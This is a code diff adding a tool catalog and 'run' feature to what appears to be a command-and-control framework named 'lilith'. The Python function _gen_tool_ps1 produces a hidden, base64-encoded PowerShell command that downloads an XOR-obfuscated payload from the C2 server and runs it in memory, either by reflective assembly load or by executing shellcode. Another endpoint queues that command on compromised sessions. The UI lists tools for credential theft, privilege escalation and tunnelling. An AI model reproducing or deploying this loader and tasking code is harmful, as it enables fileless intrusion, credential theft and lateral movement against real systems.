@@ -199,6 +199,92 @@ def _api_arsenal() -> dict:
                           "ext": os.path.splitext(fname)[1].lower()})
     return {"workspace": _workspace, "files": files}
 
+# ── Arsenal tool catalog ─────────────────────────────────────────────────────
+
+def _read_manifest() -> dict:
+    p = os.path.join(_workspace, "manifest.json")
+    try:
+        with open(p) as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+def _api_arsenal_tools() -> dict:
+    from builders.encoder import TOOL_CATALOG, find_tool
+    manifest = _read_manifest()
+    tools = []
+    for name, entry in TOOL_CATALOG.items():
+        enc_name = manifest.get(f"enc_{name}")
+        meta     = manifest.get(f"meta_{name}", {})
+        built    = bool(enc_name and os.path.exists(os.path.join(_workspace, enc_name)))
+        tools.append({
+            "name":             name,
+            "desc":             entry.get("desc", ""),
+            "default_params":   entry.get("default_params", ""),
+            "lhost_placeholder": entry.get("lhost_placeholder", False),
+            "binary_found":     bool(find_tool(name)),
+            "built":            built,
+            "enc_name":         enc_name if built else None,
+            "clr":              meta.get("clr", False),
+            "args":             meta.get("args") or entry.get("default_params", ""),
+        })
+    return {"tools": tools}
+
+def _gen_tool_ps1(enc_name: str, clr: bool, params: str) -> str:
+    import base64 as _b64
+    url  = f"{_srv()._SERVER_BASE}/{enc_name}"
+    # Decode pack_enc: base64(k1 | XOR(k2 | XOR(payload, k2), k1))
+    dec  = (
+        f"$r=(New-Object Net.WebClient).DownloadData('{url}');"
+        f"$t=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($r));"
+        f"$k1=$t[0];$m=New-Object byte[]($t.Length-1);"
+        f"for($i=1;$i-lt$t.Length;$i++){{$m[$i-1]=$t[$i]-bxor$k1}};"
+        f"$k2=$m[0];$p=New-Object byte[]($m.Length-1);"
+        f"for($i=1;$i-lt$m.Length;$i++){{$p[$i-1]=$m[$i]-bxor$k2}};"
+    )
+    if clr:
+        if params.strip():
+            arr = ",".join(f"'{a}'" for a in params.split())
+            exec_part = f"[Reflection.Assembly]::Load($p).EntryPoint.Invoke($null,@([string[]]@({arr})))"
+        else:
+            exec_part = "[Reflection.Assembly]::Load($p).EntryPoint.Invoke($null,$null)"
+    else:
+        exec_part = (
+            "$h=[Runtime.InteropServices.GCHandle]::Alloc($p,3);"
+            "([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($h.AddrOfPinnedObject(),[Action]))()"
+        )
+    ps1 = dec + exec_part
+    b64 = _b64.b64encode(ps1.encode("utf-16-le")).decode()
+    return f"powershell -nop -w hidden -enc {b64}"
+
+def _api_arsenal_run(body: bytes) -> tuple:
+    try:
+        req = json.loads(body or b"{}")
+    except Exception:
+        return _j({"error": "bad json"}, 400)
+    sid       = req.get("session_id", "")
+    tool_name = req.get("tool_name", "")
+    params    = req.get("params")   # None → use manifest default
+    if not sid or not tool_name:
+        return _j({"error": "session_id and tool_name required"}, 400)
+    manifest = _read_manifest()
+    enc_name = manifest.get(f"enc_{tool_name}")
+    if not enc_name or not os.path.exists(os.path.join(_workspace, enc_name)):
+        return _j({"error": f"{tool_name} not encoded — run: lilith build --tool {tool_name}"}, 404)
+    meta = manifest.get(f"meta_{tool_name}", {})
+    clr  = meta.get("clr", False)
+    if params is None:
+        params = meta.get("args", "")
+    cmd     = _gen_tool_ps1(enc_name, clr, params or "")
+    task_id = _srv()._c2_push_task(sid, cmd)
+    if task_id is None:
+        return _j({"error": "session not found"}, 404)
+    _srv()._sse_publish({
+        "type": "task_queued", "task_id": task_id, "session_id": sid,
+        "cmd": f"[TOOL] {tool_name} {params or ''}".strip(),
+    })
+    return _j({"task_id": task_id, "tool": tool_name})
+
 # ── Payload versioning ────────────────────────────────────────────────────────
 
 _SKIP_VERSION = {"payload_versions.json", "engagement_meta.json", "engagement.db",
@@ -370,6 +456,8 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
             return _api_c2_result(m.group(1), m.group(2))
         if path == "/ui/api/arsenal":
             return _j(_api_arsenal())
+        if path == "/ui/api/arsenal/tools":
+            return _j(_api_arsenal_tools())
         if path == "/ui/api/arsenal/versions":
             return _j(_api_arsenal_versions())
         if path == "/ui/api/admin/status":
@@ -389,6 +477,8 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
             return _api_c2_task(m.group(1), body)
         if path == "/ui/api/arsenal/snapshot":
             return _j(_api_arsenal_snapshot())
+        if path == "/ui/api/arsenal/run":
+            return _api_arsenal_run(body)
         if path == "/ui/api/admin/engagement":
             return _j(_api_admin_engagement_save(body))
 
@@ -685,6 +775,34 @@ input[type=text] {
 }
 input[type=text]:focus { outline:none; border-color:var(--red); }
 
+/* ── Tool catalog ── */
+.tool-row {
+  display:flex; align-items:center; gap:10px;
+  padding:8px 16px; border-bottom:1px solid var(--border);
+  transition:background .1s;
+}
+.tool-row:hover { background:var(--surf3); }
+.tool-status { width:14px; flex-shrink:0; text-align:center; font-size:12px; }
+.tool-name  { font-size:12px; color:var(--text); flex-shrink:0; min-width:110px; }
+.tool-desc  { font-size:10px; color:var(--dim); flex:1; }
+.tool-params {
+  background:var(--surf3); border:1px solid var(--bord2); color:var(--dim2);
+  font:10px var(--mono); padding:3px 6px; border-radius:2px; width:220px; flex-shrink:0;
+}
+.tool-params:focus { outline:none; border-color:var(--red); color:var(--text); }
+.tool-run {
+  padding:3px 10px; font-size:10px; border:1px solid var(--red); border-radius:2px;
+  background:transparent; color:var(--red2); font:10px var(--mono);
+  cursor:pointer; flex-shrink:0; white-space:nowrap; transition:all .1s;
+}
+.tool-run:hover:not(:disabled) { background:var(--red3); }
+.tool-run:disabled { opacity:.3; cursor:default; border-color:var(--bord2); color:var(--dim); }
+.tool-run.ok { border-color:var(--green); color:var(--glow); }
+.tool-cat-hdr {
+  padding:6px 16px; font-size:9px; letter-spacing:.12em; color:var(--dim);
+  background:var(--surf2); border-bottom:1px solid var(--border);
+}
+
 /* ── Astaroth chat panel ── */
 #astaroth-panel {
   position:fixed; right:0; top:38px; bottom:0; width:380px;
@@ -857,11 +975,31 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
     <div class="gview" id="gv-arsenal">
       <div class="gview-hdr">
         <div class="gview-title"><span>WORKSPACE</span><strong>Arsenal</strong></div>
-        <button class="btn btn-sm" onclick="loadArsenal()">↺</button>
+        <div style="display:flex;gap:0;margin-left:12px">
+          <div class="tnav active" id="ars-tab-files" style="font-size:10px;height:38px"
+               onclick="setArsTab('files')">FILES</div>
+          <div class="tnav" id="ars-tab-tools" style="font-size:10px;height:38px"
+               onclick="setArsTab('tools')">TOOLS</div>
+        </div>
+        <button class="btn btn-sm" style="margin-left:auto" onclick="reloadArsenal()">↺</button>
       </div>
-      <div class="gview-body">
-        <div id="arsenal-ws" style="font-size:10px;color:var(--dim);margin-bottom:12px"></div>
-        <div id="arsenal-body"></div>
+      <div class="gview-body" style="padding:0">
+
+        <!-- Files pane -->
+        <div id="ars-files" style="padding:18px 20px">
+          <div id="arsenal-ws" style="font-size:10px;color:var(--dim);margin-bottom:12px"></div>
+          <div id="arsenal-body"></div>
+        </div>
+
+        <!-- Tools pane -->
+        <div id="ars-tools" style="display:none;padding:0">
+          <div style="padding:8px 16px;font-size:10px;color:var(--dim);border-bottom:1px solid var(--border);
+                      display:flex;align-items:center;gap:8px">
+            <span id="ars-sess-hint" style="color:var(--amber)">— select a session to enable Run</span>
+          </div>
+          <div id="arsenal-tools-body" style="overflow-y:auto"></div>
+        </div>
+
       </div>
     </div>
 
@@ -1110,7 +1248,7 @@ function setGV(gv) {
   document.getElementById('ops-view').classList.toggle('hidden', gv !== 'ops');
   document.querySelectorAll('.gview').forEach(el =>
     el.classList.toggle('active', el.id === 'gv-'+gv));
-  if (gv === 'arsenal') loadArsenal();
+  if (gv === 'arsenal') reloadArsenal();
   if (gv === 'attack')  loadAttack();
   if (gv === 'report')  loadReport();
   if (gv === 'admin')   loadAdmin();
@@ -1467,6 +1605,110 @@ async function killSession() {
 }
 
 // ── Arsenal ────────────────────────────────────────────────────────────────
+let arsTab = 'files';
+
+function setArsTab(tab) {
+  arsTab = tab;
+  document.getElementById('ars-files').style.display = tab === 'files' ? 'block' : 'none';
+  document.getElementById('ars-tools').style.display = tab === 'tools' ? 'block' : 'none';
+  document.getElementById('ars-tab-files').classList.toggle('active', tab === 'files');
+  document.getElementById('ars-tab-tools').classList.toggle('active', tab === 'tools');
+  if (tab === 'tools') loadTools();
+}
+
+function reloadArsenal() {
+  if (arsTab === 'files') loadArsenal();
+  else loadTools();
+}
+
+async function loadTools() {
+  const body = document.getElementById('arsenal-tools-body');
+  const hint = document.getElementById('ars-sess-hint');
+  if (hint) hint.textContent = selectedSid
+    ? `session: ${selectedSid.slice(0,14)}`
+    : '— select a session to enable Run';
+  body.innerHTML = '<div style="padding:16px;color:var(--dim);font-size:11px">Loading…</div>';
+  try {
+    const {tools} = await fetch('/ui/api/arsenal/tools').then(r=>r.json());
+    if (!tools?.length) { body.innerHTML='<div style="padding:16px;color:var(--dim)">No tools in catalog</div>'; return; }
+
+    // Group by category derived from desc keywords
+    const cats = {
+      cred:  {l:'CREDENTIAL ACCESS',    keys:['Credential','DPAPI','Shadow','Kerberos','Chrome creds','Kerberos','NTLM']},
+      disc:  {l:'DISCOVERY / ENUM',     keys:['BloodHound','LDAP','Account','Network','AD CS','Enum','Domain','SQL']},
+      priv:  {l:'PRIVILEGE ESCALATION', keys:['SYSTEM','Impersonate','Potato','PrintSpoofer','LPE','privilege']},
+      lat:   {l:'LATERAL / TUNNEL',     keys:['tunnel','relay','SOCKS','Ligolo','Chisel']},
+      other: {l:'OTHER',                keys:[]},
+    };
+    const bucket = t => {
+      const d = (t.desc||'').toLowerCase();
+      if (/kerberos|ticket|shadow cred|credential|dpapi|chrome cred|mimikatz/i.test(d)) return 'cred';
+      if (/bloodhound|ldap|enum|account|network|domain|ad cs|sql|winpeas/i.test(d)) return 'disc';
+      if (/system|impersonate|potato|spoofer|lpe|privilege|race|escalat/i.test(d)) return 'priv';
+      if (/tunnel|relay|socks|ligolo|chisel|proxy/i.test(d)) return 'lat';
+      return 'other';
+    };
+    const grouped = {cred:[],disc:[],priv:[],lat:[],other:[]};
+    tools.forEach(t => grouped[bucket(t)].push(t));
+
+    let html = '';
+    Object.entries(cats).forEach(([k, cat]) => {
+      const rows = grouped[k];
+      if (!rows.length) return;
+      html += `<div class="tool-cat-hdr">${cat.l}</div>`;
+      rows.forEach(t => {
+        const st  = t.built ? '<span style="color:var(--glow)">✓</span>'
+                  : t.binary_found ? '<span style="color:var(--amber)" title="binary found, not encoded">○</span>'
+                  : '<span style="color:var(--dim)" title="binary not found">✗</span>';
+        const dis = (!t.built || !selectedSid) ? 'disabled' : '';
+        const hint2 = !t.built
+          ? (t.binary_found ? `title="encode first: lilith build --tool ${esc(t.name)}"` : `title="binary not found"`)
+          : '';
+        html += `<div class="tool-row">
+          <span class="tool-status">${st}</span>
+          <span class="tool-name">${esc(t.name)}</span>
+          <span class="tool-desc">${esc(t.desc)}</span>
+          <input class="tool-params" id="tp-${esc(t.name)}" type="text" value="${esc(t.args||t.default_params||'')}"
+                 placeholder="params" spellcheck="false">
+          <button class="tool-run" ${dis} ${hint2}
+                  onclick="runTool('${esc(t.name)}',this)">Run ▸</button>
+        </div>`;
+      });
+    });
+    body.innerHTML = html;
+  } catch(e) { body.innerHTML=`<div style="padding:16px;color:var(--red2)">${esc(e.message)}</div>`; }
+}
+
+async function runTool(name, btn) {
+  if (!selectedSid) { alert('Select a session first'); return; }
+  const params = document.getElementById('tp-'+name)?.value || '';
+  btn.disabled = true;
+  btn.textContent = '…';
+  try {
+    const r = await fetch('/ui/api/arsenal/run', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({session_id: selectedSid, tool_name: name, params}),
+    });
+    const d = await r.json();
+    if (!r.ok) {
+      btn.textContent = 'ERR';
+      btn.style.color = 'var(--red2)';
+      setTimeout(()=>{ btn.textContent='Run ▸'; btn.style.color=''; btn.disabled=false; }, 2000);
+      return;
+    }
+    btn.textContent = 'Sent ✓';
+    btn.classList.add('ok');
+    // switch to ops view and shell tab to watch output
+    setGV('ops');
+    setTab('shell');
+    setTimeout(()=>{ btn.textContent='Run ▸'; btn.classList.remove('ok'); btn.disabled=false; }, 2000);
+  } catch(e) {
+    btn.textContent = 'ERR';
+    setTimeout(()=>{ btn.textContent='Run ▸'; btn.disabled=false; }, 2000);
+  }
+}
+
 async function loadArsenal() {
   const body = document.getElementById('arsenal-body');
   const wsEl = document.getElementById('arsenal-ws');
